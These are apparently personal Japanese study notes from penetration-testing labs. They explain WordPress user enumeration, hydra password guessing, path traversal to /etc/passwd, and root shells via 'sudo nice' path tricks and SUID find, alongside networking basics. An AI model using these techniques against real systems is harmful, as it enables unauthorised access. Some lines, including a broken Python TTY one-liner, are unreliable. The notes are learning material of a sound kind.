### wordpressのadmin ログインページに入るために
### ユーザー名
author=1...でユーザー名を調べる
nmap script wordpressでユーザー名を割り出す
### パスワード
cewlで辞書ファイルを生成する
そのあとhydraでパスワードを割り出す
（1のときはwordpressとかのヒントもなかったのでソースを読むことにした）

#ソース　なんでソースを読むのか、挙動の根っこが見える、条件分岐、型チェック、デフォルト値、作者の意図とミスが見えるから、意図しない戻り値、設計ミス



-rwxr-x--- 1 tom tom    95 Mar 21 2019 flag3.txt
drwxr-x--- 3 tom tom  4096 Mar 21 2019 usr
ファイル（flag3.txt）
- で始まってる → 普通のファイル
rwxr-x--- → 権限（所有者は読み書き実行できる、グループは読み実行できる、他はなし）
d で始まってる → ディレクトリ







/これは？usrの前に置く理由
#### `./usr`
→ 「**今いる場所**の中にある `usr` フォルダ」  
（相対パス：relative path）  
→ 「自分の今の波動（カレントディレクトリ）から見える範囲だけでアクセスする」
#### `/usr`
→ 「**宇宙の中心（root）** から見た `usr` フォルダ」  
（絶対パス：absolute path）  
→ 「全体意識（root）から見て、その座標にある `usr` に直接つながる」
ああ、./これで一つなの？
`./` これで **ひとつの意味のあるかたまり** なんだ。
- `.` は「**今いる場所（カレントディレクトリ）**」っていう意味。
**==- `/` は「**その中の〜に入る**」という“区切り”。==**
だから `./usr` は、  
👉「**今いる場所の中にある usr というもの**」
を指定してる、ということ。

もし君が `/home/tom` という場所にいるときに：
ls ./usr
って打つと、
「/home/tom の中にある usr フォルダ」を見に行く。
逆に、
bash
コードをコピーする
ls /usr
だと、
「システム全体のルート直下にある usr フォルダ」を見に行く。

| ディレクトリ              | 主な役割                                 |
| ------------------- | ------------------------------------ |
| `/home/tom/usr/bin` | ユーザー専用コマンド（自分で入れたもの）                 |
| `/usr/local/bin`    | 管理者が手動で入れた追加コマンド                     |
| `/usr/local/sbin`   | 管理者向け追加コマンド（システム管理用）                 |
| `/usr/bin`          | 一般ユーザー用標準コマンド（ls, cat, viなど）         |
| `/usr/sbin`         | root や管理者用標準コマンド                     |
| `/sbin`             | root 用のシステムコマンド（再起動やネットワーク設定など）      |
| `/bin`              | 基本コマンド（vi, sh, echo など、ほとんどの環境に必ずある） |
- つまり **同じ “bin” でも置かれている役割が違う**
logsページってなに
- **logs = 記録**
- サーバーやアプリが「誰がいつどんなことをしたか」を記録しているページ。

POST /admin/dashboard.php?page=log HTTP/1.1
Host: 192.168.56.102
Content-Length: 15
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.56.102
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.56.102/admin/dashboard.php?page=log
Accept-Encoding: gzip, deflate, br
Cookie: pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh
Connection: keep-alive

file=log_01.txt　　これを解説してほしい
ざっくり言うと
- **あなたがサーバーに手紙を送っている状態**
- POST メソッドを使って「file=log_01.txt」というデータを送り、サーバーの `/admin/dashboard.php` にある `page=log` のページに処理をお願いしている
- サーバーはその日記帳（logs）を読んで、結果を返す感じ
1. **リクエストライン**
```
POST /admin/dashboard.php?page=log HTTP/1.1
```
- `POST` → データを送信するよ
- `/admin/dashboard.php?page=log` → ダッシュボードのログページにデータを送っている
2. **ヘッダ部分（User-AgentとかHost）**
- `Host: 192.168.56.102` → 送る相手（家の住所）
2. **ボディ部分**
```
file=log_01.txt
```
- 送っている中身（データ）。
### 波動的イメージ
- あなた（ブラウザ） → 手紙を送る
- サーバー → 日記帳を持っている管理者
- POST → 手紙にお願いを書く
- file=log_01.txt → 「この日のログを見せて！」というリクエスト
コメディ補足
- もしこのリクエストが攻撃者に見られたら…  
    → 「誰のログ見ようとしてるんだい？😏」ってサーバーがこっそり笑ってる感じ。
- POST の波動は GET より強めで「行動を起こす魔法」のイメージ。
**だからこのページでサーバーとやりとりしているから**
**サーバーのetc/passwdにもアクセスできるわけ**
また、
- `../` だけだと「一段上」のみアクセス。
- でも教科書的には、目的のファイルやディレクトリがさらに上にあることが多いので、いきなり二段上から始める方が効率的。

#port80とファイルの関係
ポート８０さえpython３で開いておけば、こっちファイルとつなげなくてもファイル名指定したら勝手に80とつないでくれるの？

結論: はい。ただし「ブラウザがファイル名を指定する」必要がある。ポート80を開いてサーバを動かすだけで、ブラウザが `http://IP/evil.html` と要求すればそのファイルを返す仕組みになる。
（超やさしく）
１ ポート80は家の「玄関のドア」。
２ pythonのサーバはそのドアを開ける「人」。
３ `evil.html` は家の中にある「本」。
４ ブラウザは「その本を見せて」と言って玄関から入ってくる。URLで「どの本か」を指定する。
５ サーバの人が家の中にその本（ファイル）があれば渡す。なければ「ないよ」と言う。





あなたの質問（「ブラウザでのやりとりは『外に出る』？」）への答え

- 一般論として：ブラウザが外部のサーバー（http://〜）に接続する行為は「外に出る」ことを意味する。portを使うから
## 1. NAT
**Network Address Translation**
**Network（ネットワーク）** → 魔法の国みたいにいろんなコンピューターが住んでる場所
**Address（アドレス）** → それぞれのコンピューターの家の住所
**Translation（翻訳）** → 魔法のマントでその住所を変身させて、外の世界でもわかるようにする
VMはホストPCの中で小さな宇宙（小宇宙）を作っているようなもの
- この小宇宙の住人（VM）が外の大宇宙と安全に話したい
- でも、直接IPを使うと外の宇宙に名前バレ（アドレス重複など）して混乱するかもしれない
- そこで **NAT（Network Address Translation）** がマントで住所を「外向けアドレス」に変身させる。外のインターネットは、NATマントのおかげで全員1つの安全な顔に
**具体的に何をしているか？**
　デフォルトで各VMは**個別にNAT**
- 内部ネットワーク（家庭やVM内）で使っているプライベートIPを 外のネットワーク（インターネット）で通用するグローバルIPに「翻訳」して通信する。外に手紙（HTTPリクエスト）を出すときは、門番（VirtualBoxのNAT）が届けてくれる
- 外部から直接 VM への接続はできない
- VMや家庭内ネットワークの内部IP（小宇宙の住所）は **完全に隠れる**。外のインターネットから見ると、全部「ホストPCの1つのアドレス」に見える
- だから、外の世界から「どのVMが通信してるか」は分からない→ VM A が VM B に直接「ねぇ話そう！」と手紙を出しても、門番が止めちゃう、 二人は**直接おしゃべりできない**。互いに受けることができない
## 2. NAT Network 
- 同じ NAT Network に参加するVM同士は、直接通信可能。
- 外部からは通常アクセスできず、ホスト経由でのアクセスが必要。
- IPアドレスはDHCPで自動配布されることが多い。
## 3. Host-only
- VMはホストPCとだけ通信可能。
-具体的には
1. **IPアドレスの割り当て**  
    ホストPCが仮想マシン専用のIPを渡しする。
2. **内部ネットワーク通信**  
    VMからホストへのPing、SSH、RDPなどの接続ができる。
- インターネットにはアクセスできない（必要ならホスト側でルーティング設定）。
- 複数のVMを同じHost-onlyネットワークに入れれば、互いに通信可能。
具体的には
- **IPレベルでのやり取り**  
    例：Ping、SSH、
- **サービス同士の接続**  
    仮想マシン上で立てた小さなWebサーバ（HTTP）やアプリサーバに、他のVMホストからアクセス可能。  
    → ただしこれは外のインターネット経由ではない。
VM AにPythonサーバーを立てる
-  **8000番ポート** でWebサーバーを立てる
- インターネットは関係なし
- でも同じHost-onlyネットワーク内のVM BやホストPCからアクセスできる
VM BからVM Aのサーバーにアクセスしてファイル取得
curl or ブラウザ経由で受け取れる

つまりHost-onlyでも、ブラウザ経由のHTTP通信やPythonサーバー経由でのファイル授受は、可能
## 4. Bridged（ブリッジ）
- VMは物理LAN上の一台として振る舞う。
- 同じLAN上のPCから直接アクセスできる。
- 外部からのアクセスも可能になる

==PingとHTTPの違いを==、
1️⃣ Pingと通信の関係
- **Ping** = ICMP
   ：Internet Control Message Protocol
    - **Internet** → インターネットの、つまりIPネットワーク上で
    - **Control Message** → 状況やエラーなどの「制御メッセージ」をやり取りする
    - **Protocol** → ルール・約束事
- - Pingは **ICMP（Internet Control Message Protocol）** という特別な手紙でやり取り
- 基本は「到達確認」だけ手を振るだけで,、ネットワーク層インターネット層で届いた→ データ送信には向かない何か荷物を渡すことはできない- HTTP通信やTCP接続とは別物ポート番号を使わない
※デフォルトNATでも、VirtualBoxが内部でルーティングしている場合、**同じホスト上の別VMにはPingが届く
2️⃣ ブラウザの通信とは？
- ブラウザのHTTP通信は **TCP/IP上のポート番号とアプリケーションプロトコルのルールに従った通信** 荷物（データ）をちゃんと届ける手順がある
- デフォルトNATだと、VM AからVM BのHTTPポートに直接届かない
    - NATが「門番」としてTCP接続を遮断しているから

| 特徴    | Ping    | HTTP         |
| ----- | ------- | ------------ |
| 層     | ネットワーク層 | アプリケーション層    |
| ポート番号 | なし      | 必須（80/443など） |
| 目的    | 到達確認    | データ交換        |
| 信頼性   | 届いたかだけ  | 順番や完全性を保証    |
|       |         |              |

## 🧩 それぞれの層の対応

| 現実のたとえ        | ネットワークの層            | 役わり                             | データの名前（送る単位）                  |
| ------------- | ------------------- | ------------------------------- | ----------------------------- |
| 紙に書いた手紙       | **アプリケーション層**       | 実際に送りたい中身。たとえばメール文、チャット文など。     | **データ**（メッセージ）                |
| 郵便局がチェックして仕分け | **トランスポート層**        | 相手のアプリにちゃんと届くように、分割・整理・順番づけをする。 | **セグメント（Segment）**            |
| 住所ラベルを書く      | **インターネット層**        | どのパソコンに送るかを決める。住所＝IPアドレス。       | **データグラム（Datagram）**          |
| 配達員が封筒を運ぶ     | **ネットワークインターフェース層** | ケーブルやWi-Fiで実際に電気信号として運ぶ。        | **パケット／フレーム（Packet / Frame）** |
| 道・電線・光ケーブル    | **ハードウェア層**         | 信号を流す物理的な道。                     | ―（実際の物）                       |

---

## 💬 各データの意味（もっとやさしく）

- **データ（アプリ層）**  
    　＝「手紙の中身」  
    　例：メール本文、LINEメッセージ、Webページの文字。
    
- **セグメント（トランスポート層）**  
    　＝「長い手紙を小分けにしたページ」  
    　大きいデータを分けて、順番番号をふる。TCPやUDPがこれをやる。
    
- **データグラム（インターネット層）**  
    　＝「住所ラベルを貼った小包」  
    　どの家（IPアドレス）に送るかが書いてある。
    
- **フレーム／パケット（ネットワーク層）**  
    　＝「実際に配達員が運ぶ封筒」  
    　1つの機械（ルーターやPC）から次の機械へ運ばれる単位。
    

---

## 🧠 まとめるとこう

```
アプリ層　　　　　→　手紙の内容（本文）
トランスポート層　→　ページごとに分ける（セグメント）
インターネット層　→　住所を書く（データグラム）
ネットワーク層　　→　封筒に入れて運ぶ（フレーム・パケット）
```

---

### 📮 最後に

だから「セグメント」「データグラム」「フレーム」は、  
同じ“データ”を階層ごとに別の名前で呼んでいるだけ。

> 💡例：  
> Webページを見るとき  
> → HTML（アプリ層のデータ）  
> → TCPで分割（セグメント）  
> → IPで住所（データグラム）  
> → LANケーブルで送信（フレーム）


#### Parrotの基本ディレクトリ
#/bin 基本となる実行ファイルやコマンド
#/home ユーザー個別ファイル
/homeはユーザーの部屋が並んでる建物の階みたいなもの
/home/alice あるユーザーのホームディレクトリの一つ上のディレクトリは親ディレクトリ/home, 

#/usr 各ユーザーが共通して利用するプログラム
#/var 時間の経過とともに変化するデータ


相対パス　.. 一つ上のディレクトリ、親ディレクトリを意味する
パーミッション部の一文字目dならディレクトリ　lならシンボリックリンク
シンボリックリンク　→の先があ実体の場所　机の上にのーとはここ！と紙を置く
　　　　　　　　紙そのものはノートの中身ない



通信の仕組み

　　　送信　　　　　　　　　　　　　　受信
紙　　　　　　　アプリ層
郵便局チェック　　トランスポート　　　　　　セグメント
住所ラベル　　　インターネット　　　　　　　データグラム
配達員　　　　　ネットワークインターフェース　パケット（封筒）
道路、電線、光　  ハードウェア　　　　　　　フレーム



#etc/passwdの第七フィールド　はログインした後に動く
プログラム＝シェルを決める欄　bash,shだとターミナル開いて、ユーザー名＋パスワードでログインできる。/nologin, /false だと人間用でなく、システム用のアカウントだから、名前はあるけど、人が中に入って操作する想定じゃないアカウントなので入れない。



#php ［］がついてたら配列として受け取るというｐｈｐ固有のお作法

`username=admin&password[]=test` のように **`[]` を名前に付けると、そのパラメータが「配列」として扱われる**のは、主に **PHP（やPHP互換のパーサ）がフォームデータ／クエリ文字列を解析するルール**だから。  `password[]` と読まずに **`password` の “配列要素”** として扱うルールを持っている。

`[]` は特別な魔法のトークンで、「ここに複数の値をためてね」
## なぜ「=の前に [] を置くと配列になるの？」の正確な言い方

技術的には `[]` は「キー名の一部」ではなく **パーサへの指示（syntax sugar）**。  
パーサが `key[]` を見た瞬間、「あ、これは key の配列要素だ」と内部で処理するんだ。だから見た目は `key[]=` の形だけど、パーサにとっては「キーkeyで配列を作れ」という命
直接配列を入れればいいじゃんと思っても、既存のＵＩがそれを許してくれないことがほとんどだから
NULLと０の違いを同じ扱いにするから、パスワード間違ってるのに通っちゃうというバグが起こる。＝＝型変換ルールのとき

#環境変数 　親プロセスにおいた環境変数はその親から生まれた子プロセスも読める、環境変数は直接のコマンドにはならない

#変数　普通のフォルダにはない。cajaとかで見れない。シェルやプログラムだけ読める魔法のメモ帳、何らかの値に名前を付けて、その値を参照する変更する、値として一時的に記憶する、机の上で覚えてる情報を管理してる、目に見えないけど作業をスムーズにするために必要な情報をもってる

#コマンド、path、ディレクトリ、コンピュータ　コマンド＝本の名前、コンピュータ＝探す司書、ディレクトリ＝本棚　path＝ラベル、図書館のどの本棚を探すかのリストがある



#〈基本的なファイル実行の流れ〉　
１　コマンド入力、起動要求
　ユーザーがシェルやプログラムから「これを実行して」と指定する＝どのファイルを動かすか、その場所（パス）を教える
　パス　　→絶対パス指定　/user/bin/id 場所を正確に言ってる
　　　　　→相対パス指定　./run 今いる場所からの道
　　　　　→単純名　id 「名前だけ言ってる」のでシェルがPATHを見て探す
２パス解決
絶対パスならその場所を使う
相対パスならカレントディレクトリ基準で解決

３存在とパーミッション（ｘ）チェック
４プロセス作成（子プロセスを作る）
５実行
子プロセスで実行イメージを置き換える、子はbashのコピーから「新しいプログラム」に入れ替わる。終わったらbashが受けとる
★ファイルXがroot権限で外部から指定したプログラム（id)を実行する
ｘがその指定を検証しなければ、攻撃者が別のファイルを指定してしまい、そのままroot権限で動いてしまう危険がある。これがrootシェルを奪われる流れ

ファイルあるが、読み取る権限ない
→nice(root権限で実行できる)使って調べる、niceは読めないが実行できる。どう動くかを外から見る
→idというコマンドがroot権限で動いている

sudo /bin/nice 　/note/../bin/bash
      経由　　    実行対象　（bin/bashと同じ）
      　　　　　　普通はこの書き方しない、でもセキュリティ上の制限をすり抜けるため、ルールの穴を突いてrootシェルを取るトリック
「sudo権限でniceを使って次のものつまりbashを実行する」
→/noteに入ってから、..で一つ上の階層に戻り、そこからbin/bashを指定している

#攻撃対象のパソコンはftpサーバーでもあるということ 攻撃側はクライアントとして接続してファイルの送受信や一覧取得する

１ftp<接続したいIP＞ で接続
ユーザー名、パスワード
２　ftp>プロンプト
今サーバーと会話中の状態を示す
シェルとは別、以降のコマンドはftpプロトコルサーバに命令送る
３　ls押すと
見えているのはサーバー側のディレクトリ構造、あなたのローカルPCではなく、接続中のFTPサーバの中身


#バインドシェル　
１サーバー（攻撃される側）自分の家でドアを開けて待ってる
２クライアント（攻撃する側）ピンポン押して家に入る
３入ったらサーバーがリモコン渡す

#リバースシェル　被害者がつながりに行く
１クライアント（攻撃する側）が教室で誰か来ないか待ってる
２サーバー　（攻撃される側）自分からその教室に入っていく
３行った瞬間　自分のリモコンをクライアントに渡す

#痕跡　shell コマンドはターゲット上で新しいシェルプロセス（/bin/sh)を起動するコマンド、起動したプロセスはターゲット側に痕跡残る

#background 今やってる遊びをいったんカバンにしまって手を空ける。→meterpreterセッションバックグラウンドに回され、mdfプロンプトになる。また、session -i 1(id)で戻れる。

#teletypewriter 遠くのコンピュータに文字を送ったり、紙に出力したりできるやつ
　　　　　　　→「文字でコンピュータと話す場所」
#tty ターミナルの昔の名前、今ターミナルで作業しても裏ではttyと同じ仕組みの流れを受け継いでいる。
input,txt >/dev/tty3000 　　　input.txtを食って B に渡して　

#ペイロード練習　parrot osマシンで簡易httpサーバーを起動してparrotos-testマシンからwgetコマンドでevil ファイルをダウンロードする。ペイロード自体に「攻撃側と繋がれ」という命令するコードが含まれている。ペイロードが動くと、その住所に向かって自分から接続試みる。でも攻撃側で待ち受け（ハンドラー）が起動していなければつながらない。このときmultihandler使う。multi いろんなペイロード受けられる受け口（handler)

#シェル　#シェル　今どこの棚（ディレクトリ）で作業してるか決める人bash シェルの一種コマンドを受け取って実行する、カーネル（殻）の外側にある命令通訳者、外から中を操作するための入り口、カーネルに直接触るのは危険なので、外側に殻としてインターフェースを用意した
見えない脳みそ
シェルは理論上無限に起動できる
シェルは基本的にはほどんどどこでも起動できる。
普通に起動→普通の力、（ユーザー）
sudoやsuで起動→rootの力で動くことがある


#ターミナル　その脳みそと会話する口と耳、ターミナルは舞台、シェルは舞台で動く役者、ターミナル開くと自動でシェルが起動する

ターミナルを複数開く、→複数のシェルが同時に動いてる

#exploitの実行　ソフトや機械の「壊れやすいところ」を使って本来できないことをさせる行為
構成要素１　脆弱性
　　　　２　ペイロード　（やらせたいこと）
　　　　３攻撃方法（ペイロードを届ける方法）

#meterpreterセッションからシェルに切り替える　meterpreterでつながれば、シェル操作は簡単になることが多いができることは、meterpreterが持ってる力（権限）ハッキングリモコン一旦おいて、相手のPCそのままのコマンド端末にはいること


#/usr/bin/find ファイル名でもあり、パス（場所）でもあり、実行できるものでもある。

#-2なぜシェル起動したいだけなのにわざわざfind-exec使うのか 普通に/bin/bash叩いても普通の力しか使えない。sudo使えばいいが、パスワードがいる。
findがroot持ってると、find経由で出した脳みそが大人の力になることがある。（findが実行する子プロセスにその権限が引き継がれることがある。）

/usr/bin/findは魔法の箱（suid付き）その箱を通して、脳みそを起動するとroot付きの脳みそになる。だから最初にフォルダを見つけるかどうかとか関係なく、このfindを通せば、強い脳みそが出る。
→だから回りくどく見えても、それを使う意味がある。

#一時ファイルを調べる意義　/tmp /var/tmp /dev/shm  機密が残ってないか調べえるため、保存されがちな使えるもの。パスワード、一時アップロードされたファイルsshの秘密鍵


#ipアドレスの後にポート番号　つけずにアクセスすると、ブラウザはデフォルトポートを自動で使う

#fping f=fast 複数のホストを並列で高速にping送信できる


#ipipv4 ipv4は全体で３２bit。

基本的に最初の３オクテットがネットワーク部　最初の一つがホスト部
　　　　→　同じネットワーク上の機器は、ネットワーク部が同じ
　　　　/24 =最初の２４ビットがネットワーク部という意味、残り８ビットがホスト部
　　　
残り８ビット　２の八乗＝256　通り作れる

　.0はネットワーク番号
192.168.1.0/24 とかくと、この範囲のすべてのホストに関するルートやポリシーを指定できる。

個々の端末（192.168.1.1, 192.168.1.2......)でなく、ネットワーク全体という集合を示すラベル　家一軒でなく、通り全体を指す札

#shell0 $SHELL はログイン時に選ばれたデフォルトのシェルのパス、魂が最初に選んだ乗り物

$0は今実行しているフレキシブルシェル、スクリプトの名前、今この瞬間のあなた自身を移す鏡

自分のエネルギーを自分に問いかけている。自分に向かって「おい、これ誰だ？」

$shell =rbash, $0=bash同時に起こりうる。ユーザーがrbashの制限超えて、bashを直接起動した場合

＄０自体は変数、現在実行しているスクリプトやシェルの名前を指す、特別な変数

echo $0 で名前が出力される

#cmsログイン　ログイン画面はcmsが操作されるための玄関
＝ＣＭＳのコントロールパネルの扉

#curl ブラウザみたいに見せるんじゃなく、サイトの返事だけキャッチする魔法の手紙受信機って感じ

サーバーにhttpリクエストを送るコマンド
このＵＲＬの情報をちょうだいと宇宙に投げるメッセージみたいなもの

あなた：探検家（ブラウザ、curl)
ウェブサイト：家（サーバー）

http レスポンス：家からの手紙
リダイレクト：手紙にこっちの家に行ってね！って書いてあるサイン

１あなたが「この家（URL）に行きたい！」って思って探検に出る
２curl コマンドはあなたの「探検用のロボット」みたいなもの
３でもその家に行ったら手紙が届く「あれ？この家はもうここじゃないよ。こっちにいってね！」
というサイン

４curlにーLオプションを付けると、「わかった、じゃあその新しい家まで飛ぶよ！」結果として２つの手紙（元の家と新しい家の返事）を見ることができる
ーLは「手紙の指示通りに新しい家までちゃんと行く魔法」

#サイト＝大きなお城
見えないフォルダ、ファイル≒裏口のドア、倉庫みたいな部屋
クリックしていけないけど、URLを知っていれば入れる場所のこと

#どのCMS　を使っているかをばれるのは危ない
攻撃者がそのCMS特有の既知の脆弱性を狙ってくる、使っているプラグインやバージョンを探り当てる、特定のCMS向けの攻撃ツールが大量に存在するので狙われやすさが上がる

#wordpress 「wordpress URL>/?auther=1」にアクセスすると、ユーザー名にリダイレクトされるユーザー名判定

#cat>users.txt  今から入力する文字をusers.txtに書き込みます、ctrl +Dで入力終わり

#vi  viでファイルを開くとは、読むだけでなく、現実を変える力を持っているということcat以上のことができる

viの機能を通じてシェルを起動できるアプローチ


#rbash で試せることが多いコマンドリスト
pwd 今どこ
ls 現在のディレクトリに何あるか
cd移動
echo 自分のエネルギーを試す
　　　文字、変数を宇宙に放って反応を見る
cat,more,less ファイルの中身を観察
type,which コマンドが存在するか、波動が通るか
history, help, 
set, env 宇宙の法則をちょっと覗く
ext

rbash ではパス外のコマンドは基本使えない。rbash ではpath に乗ってないコマンドは使えない。
下準備：
→使わせたいコマンドだけを限定したpathに登録する
また、/etc/passwd でユーザーのシェルを/bin/rbashに変更する
rbashではpathという地図に載ってる通路しか通れない

意義　自分の部屋にとどまるのでシステムの管理者の管理が安定

bashはフルパス指定で、PATH外コマンドも使える。rbash　ビルトイン（pwd echo history内部にある。）は基本使えるけど、基本cdはrbashの性質上使えない。なぜなら、「カレントディレクトリ（作業場所）を変える行為を禁止という制度がrbashの中に最初から組み込まれているから。rbashって今いる場所で波動を完成させなさい。と言われている修行モード
明示的に禁止

存在意義　「このユーザーには特定のことだけやらせたい」という安全策
使われる理由：セキュリティユーザーに危険操作
（システムファイル削除など）させない
教育、新しいユーザーに限定された操作環境で慣れさせるex 新入社員、初心者用、危険な操作ができないように制限されたbash




#ftpユーザ、ホスティングuser　 file transfer protocol　　rbashの例
ftp user サーバーにいる人でファイルを送受信するだけの役割を持つ存在、自動スクリプトやバックアップツールがファイル送受信するために存在

ホスティングuser　サーバー上で自動的に動く、プロセスやウェブサイト用のアカウントとして作られる
サーバー上で自分の領域（ディレクトリ）を持ってるユーザーを指す。サーバー管理者目線「このユーザーにスペースをホストしている」
利用者目線「わたしはホスティングを受けているユーザー」貸す側と借りる側のエネルギーが交差してる状態

hosting: インターネットプロバイダのサービスの一形態で、顧客のウェブサイトをプロバイダのサーバに置くもの、借りているという意味になる
サーバーの一部を与えられた存在

どちらも基本的には、人間がガチャガチャ操作する前提じゃなくて、システムやプログラムが操作する存在として設定されている。

#PATH 
コマンドを呼び出すための宇宙の地図であり、効率と秩序を与えるための必須アイテム

存在意義　コマンドを探す効率を上げる
bashはどこにコマンドがあるか毎回探すのは面倒！
PATHにディレクトリを登録しておくと、自動で順番に探してくれる

道路を決めることでエネルギー（コマンド）が迷子にならずに効率よく流れる。
無制限にすべてのディレクトリを探しに行ってエネルギーが散漫になる

PATHは宇宙の通れる道リスト　
その道にコマンドが存在すれば、勝手に呼び寄せるでも道にないものは「隠し部屋の宝物」みたいなもので、フルパス指定しないとは入れない

path にあるディレクトリにそのコマンドなければ、bashは見つからないという
でもフルパス指定すれば実行可能
pathはコマンドを探すときにbashが見るディレクトリのリストつまり、全部のコマンドそのものが載ってるわけではない。＄PATHディレクトリの場所だけ書かれてる。

#cmsとsshのカギ　同じにする人いる。鍵一緒にすると泥棒に一気に全部開けられる感じ
cmsログイン　ウェブサイト上の管理画面
sshアクセス　コンピュータそのもの　osレベルで
　　　　　 自由に操作できる


#sshどんな持ち主か
ssh ,httpのtcpポート開いてる

持ち主はウェブサイトを運営している可能性がある
また管理者として自分で操作している可能性がある

httpだけ＝ウェブサイトを見せるくらいはできる人
sshも開いてる＝大体は自分でサーバー運営できるくらいの技術者

サーバー運用＝管理を別のパソコンでやること同じ部屋であっても

サーバー＝一台のパソコン

この人はウェブサイトを作って運営してて、自分でコンピュータを管理できる技術がある人

サーバー管理でssh必要
→サーバーに直接行かなくても操作したい

知識あるけど油断してると自分で自分の首しめることになる。

ssh ＝暗号化された裏のカギ
これがあると遠くの管理用のパソコンから安全にログインできる

両方開いてる＝そのマシンは「ウェブを出してて、管理者が遠隔で入れるサーバー」と考えてok

いつも電源入ってるサーバーっぽいやつが多い


#強いかぎで動かしたプログラム　（sudoを付けてphython3 httpサーバー立ち上げた）は強いかぎで調べないと見えない。（sudo lsof)

#nmap のtcp synスキャン
tcp のsyn ＝通信を始めるときに出すはじめのノック信号
tcpでつながるとき3回の合図
１クライアント「入っていい？」syn
2 サーバ　「いいよ」syn +ack
3クライアント「入るね」ack

#synスキャン
１と２だけやって３はやらない
つまり、ピンポン押して相手が返事したら「この部屋（ポート）は開いてるなとわかる。
２までだけで調べる。相手にばれにくくて、速いドアベル調査
ピンポンだけ押して逃げる

nmap で
-sS tcp scanする
-p ぽーとを指定する

#tcpフルコネクトスキャン　
＝-sT

#udpscan -sU

逆　udpでは返事がないことを手掛かりにする調べ方
udpはtcoのようなピンポン返事ない。だから空っぽの手紙（udpパケット）をポストに入れる
1返事なければ「誰かいるかもしれない（開いてるかも）」 open or filtered
２逆に「そんな部屋ないよ！」（ICMPエラー）って返事来たら「閉じてる」とわかる unreachable

udp scanは結果信頼性に欠ける

#/etc/hostsノートについて　
dnsという世界中の住所帳を見る前に
まず、自分のノート（hosts)を見て、「あ、書いてある！」ってなったらその住所に行く。
世界のだれかに聞く前に「私はここにつながる」と決めてる場所

語源　host=ホスト（接続先のコンピュータ）から

経緯　1970年代　インターネットは小さなグループだけ
HOST.TXTを一つの場所で管理してみんながコピーして使っていた。全員が同じノートを見ていた。
1980 コンピュータが何千台も、手動で配るの不可能
↓　
DNS 分散された自動住所帳
名前を聞かれたら答えられる専門のサーバーが世界中に配置

＊でもhostsファイルは、開発者がテスト用に自分のパソコンだけ別の場所にアクセスさせたいときに便利だったので残った。
そしてDNSよりも優先して読むというルールになっている。

：集合のネットワークができても、個人の意図（hosts)は最優先される

＊DNSサーバーものーとではある
ただ構造と更新の仕組みが違う

ルートから枝分かれ
DNSは階層構造

一番上に１３台のルートサーバーがある。
その下に、.com .jp .netなどのトップレベルドメイン（TLD）サーバー

さらにその下に、各ドメイン（example.comなど）の権威サーバー

登録は手動、参照は自動

最初の登録は人間が手で設定する。その情報を世界中のDNSサーバーが自動でキャッシュ（一時保存）して中継する

#リダイレクトはなぜ起こるか
webサーバーの指示がDNSで通じてない状態
①
192.168.56.106 のwebサーバーがリクエストを受けたときに、httpレスポンスでmoved permanently　location:http://dc-2/
このlocation~dc-2/1のヘッダーがリダイレクト（転送）の命令
本来このサイトは「http://dc-2/ というホスト名でアクセスしてね」と設定している＝webサーバーの設定で正規ホスト名（dc-２)でアクセスさせたいとしていしているから

②ブラウザはその名前をIPに変換する必要がある（DNS）
③parrotはdc-2がどのIPかわからない

＊
二度手間なのになぜそこまでしてホスト名で立てたいのか

一つのパソコンで複数サイト（会社サイトとブログサイトのような）を立ち上げたいときの区別に役立つ
これをバーチャル（仮想）ホストという（語源：一台のサーバー「本当の家ホスト」の中にあたかも別々の家ホストがあるように」見せることができる）

IPだけでは複数サイトを区別できない
HOSTヘッダをみれば、同じIPでもどのサイトにアクセスしたのかわかる

リクエストがIPだけの場合、サーバーはどのサイトを返すかあらかじめ決めている

webサーバーの設定で「デフォルトのサイト」を指定することが多い
Hostヘッダ付きアクセス」→ブラウザが指定したサイトを返す
ブラウザはHOSTヘッダを見ることで、どの部屋に入るか判断する

また、ホスト名を使うと、セキュリティも、証明書もIP変更も楽になる。

hosts fileについて
まず、正確なIPにワープして、そのあとHostヘッダーをみて、そのあと、どのサイトのコンテンツを返すか判断する
ホスト名が最終的にどの部屋に入るかのスイッチになる

#tabnaでさっき勝手にログインされた理由

なぜ勝手に親ページにログインされていたのか、p542
nappyはcron（chronosギリシャ語の時間）という定期的な実行を支援する仕組みでアカウントの認証してたんだ。


#ログインシェルと非ログインシェルを分ける意義
システム的には全部読み込むのは重いから
タブを開いただけで全設定を読むのは効率悪いから

ログインシェル：ターミナル開いてログインしたとき、SSHで遠隔のシステムに入ったとき

非ログインシェル：ターミナルで新しいタブを開いたとき、スクリプトを実行するとき（ちょっとした魔法を唱えたいときが多い、フルチャージ必要ない）

shopt login_shell で確認できる


#リバースシェル実行した後シェルが不安定なのは
魂だけ来たから手も口も動かない

通常の対話型シェルはTTYやPTSなどの端末デバイスに接続されている→プロンプトがでる

しかし

リバースシェルはTCPソケットを介してシェルを遠隔で開く、その時開かれるのは端末（TTY)を持たないシェル→コマンド動かなかったり、バックスペース効かない、出力が詰まる
→対処法
リバースシェルを得た後、多くの人がTTYを割り当てて、インタラクティブ化する手順を取る（現実化の器）

python3 -c 'import pty.spawn("/bin/sh")'


#アンカータグにおいてtarget＝blank だとタブナビング攻撃ができる可能性がある

タブナビング
tab +navigation(移動する)
「タブを行き来している間にこっそり悪さをすること」
タブを切り替えて（ナビゲートする、航行、移動）ときに攻撃されることから
ex 勝手にフォームに情報を入れられる、知らないうちに送信される

一度離れたタグが戻った時に本物そっくりの偽サイトに変わってる感じ、こっそり書き換え、ログイン情報などを騙しに来る。

Aアンカータグ＝クリックすると、別のページや場所にジャンプする。インターネットの目次みたいなもの。クリックできる文字や場所を作るもの

href属性にはリンク先を
＜a href="http://192.168.56.101/"target="_blank">here</a>
    文字列
target属性はリンク先をどこで開くのかを設定できる
target="_self" 同じタブで開く
target="_blank"新規タブで開く

⇒リンク先のURLこれが別のタブで開かれる

malicious.html 見た目は普通だけど中でこっそり悪さをするwebページのファイル
＜a href="malicious.html"target="_blank">新規タブで開く</a>

href=hypertext reference(ホームページで使われている仕組み＋参照、指し示すもの)

